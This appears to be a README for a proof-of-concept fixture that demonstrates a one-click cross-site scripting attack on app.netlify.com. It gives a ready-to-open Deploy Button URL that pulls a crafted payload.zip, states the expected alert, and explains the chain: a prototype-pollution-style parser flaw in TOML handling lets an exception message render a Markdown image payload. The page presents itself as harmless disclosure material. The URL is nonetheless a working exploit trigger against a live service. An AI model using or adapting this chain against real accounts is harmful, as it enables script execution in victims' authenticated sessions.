# Deploy Button one-click XSS fixture

Owned, harmless proof fixture for the verified `app.netlify.com` chain.

Open this URL while signed in to Netlify, then click **Load Template** once:

```text
https://app.netlify.com/start/deploy?zip=https%3A%2F%2Fraw.githubusercontent.com%2Flmzkjmiajzj-lgtm%2Fnetlify-deploy-button-one-click-xss-20261016%2Fmain%2Fpayload.zip
```

Expected result:

```text
Netlify app one-click XSS: app.netlify.com
```

The first TOML parser pollutes the Markdown component map. The Deploy Button page's simple second parser then throws while traversing an inherited primitive whose value contains the Markdown image payload. The page catches that exception and renders its message through the Markdown alert in the same click.

`payload.zip` SHA-256:

```text
73fe0a9ac10f6bf177b69d22165e20c872bb8772affd79ccd38e68b10f0e86ab
```
